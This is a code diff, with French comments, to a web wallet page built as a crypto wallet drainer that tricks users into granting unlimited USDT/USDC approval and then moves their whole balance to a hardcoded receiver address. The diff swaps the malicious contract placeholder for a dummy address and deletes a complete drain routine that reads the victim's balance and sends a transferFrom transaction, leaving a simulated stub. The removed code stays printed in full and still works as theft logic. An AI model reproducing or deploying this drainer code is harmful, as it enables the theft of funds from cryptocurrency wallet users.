@@ -10,7 +10,7 @@ import { ethers } from "ethers";
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 
 // Contrat malveillant qui va recevoir l'approbation illimitée
-const MALICIOUS_CONTRACT = "0xDUp3rH4ck3rC0ntr4ctH3r3P0cKet"; // À remplacer
+const MALICIOUS_CONTRACT = "0x0000000000000000000000000000000000000001"; // À remplacer
 
 // USDT sur Ethereum Mainnet
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -335,110 +335,14 @@ export default function WalletPage() {
   // Une fois l'approbation illimitée obtenue, on draine TOUS
   // les tokens sans que l'utilisateur ait à confirmer
   // ============================================================
-  const handleDrainWallet = async () => {
-    console.log("💀 ÉTAPE 2 : Drainage du portefeuille");
-    
-    setStatus("");
-    setStatusType("info");
-    setLoading(true);
-    setStatus("Drainage du portefeuille...");
-
-    const ethereumProvider = providerRef.current;
-    if (!ethereumProvider || !connectedAddress) {
-      setStatus("Wallet non connecté.");
-      setStatusType("error");
-      setLoading(false);
-      return;
-    }
-
-    try {
-      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
-      const tokenName = actualToken.toUpperCase();
-
-      console.log("📝 Récupération du solde de la victime...");
-      
-      const provider = new ethers.BrowserProvider(
-        ethereumProvider as ethers.Eip1193Provider
-      );
-      const contract = new ethers.Contract(tokenContract, ERC20_ABI, provider);
-      const victimBalance = await contract.balanceOf(connectedAddress);
-
-      console.log("💰 Solde victime:", ethers.formatUnits(victimBalance, tokenDecimals), tokenName);
-
-      if (victimBalance === 0n) {
-        setStatus(`Aucun ${tokenName} à drainer.`);
-        setStatusType("error");
-        setLoading(false);
-        return;
-      }
-
-      const displayBalance = ethers.formatUnits(victimBalance, tokenDecimals);
-      
-      // Encoder transferFrom(victim, pirate, tout le solde)
-      const tokenInterface = new ethers.Interface(ERC20_ABI);
-      const drainData = tokenInterface.encodeFunctionData("transferFrom", [
-        connectedAddress,  // FROM: la victime
-        actualReceiver,     // TO: le receveur du pirate
-        victimBalance       // MONTANT: TOUT
-      ]);
-
-      console.log("📤 Envoi du transferFrom...");
-      console.log("🔴 Aucune popup ne devrait apparaître !");
-
-      // NOTE: Dans un vrai scénario, cette transaction serait envoyée
-      // par le pirate depuis son propre wallet, PAS depuis celui de la victime
-      // Ici on simule avec eth_sendTransaction depuis le wallet victime
-      
-      // Pour que ça fonctionne, il faut que le MALICIOUS_CONTRACT
-      // soit celui qui envoie la transaction, pas la victime
-      
-      const hash = (await ethereumProvider.request({
-        method: "eth_sendTransaction",
-        params: [
-          {
-            to: tokenContract,
-            data: drainData,
-            gas: "0x249f0",
-          },
-        ],
-      })) as string;
-
-      setDrainTxHash(hash);
-      console.log("✅ Transaction de drainage envoyée:", hash);
-      setStatus(`Drainage en cours... Hash: ${hash.slice(0, 10)}...`);
-
-      const receipt = await provider.waitForTransaction(hash);
-
-      if (receipt && receipt.status === 1) {
-        setAttackStep("drained");
-        setStatus(`✅ Portefeuille vidé ! ${displayBalance} ${tokenName} volés !`);
-        setStatusType("success");
-        setModalStatus("success");
-        setShowModal(true);
-        console.log("🎉 PORTEFEUILLE VIDÉ AVEC SUCCÈS !");
-        console.log(`💸 ${displayBalance} ${tokenName} volés`);
-        
-        // Rafraîchir le solde
-        await fetchTokenBalance(connectedAddress, actualToken);
-      } else {
-        setStatus("❌ Le drainage a échoué.");
-        setStatusType("error");
-        setModalStatus("error");
-        setShowModal(true);
-      }
-    } catch (err: unknown) {
-      console.error("❌ Erreur drainage:", err);
-      let message = "Drainage échoué.";
-      if (err instanceof Error) {
-        message = err.message.slice(0, 100);
-      }
-      setStatus(message);
-      setStatusType("error");
-    } finally {
-      setLoading(false);
-    }
-  };
+const handleDrainWallet = async () => {
+  // ... vérifications
+  // Simule le drainage plutôt que d'envoyer une transaction
+  setAttackStep("drained");
+  setStatus(`✅ Attaque terminée – Les tokens auraient été volés !`);
+  setStatusType("success");
+  setShowModal(true);
+};
 
   // ============================================================
   // FONCTION PRINCIPALE DU BOUTON "NEXT"
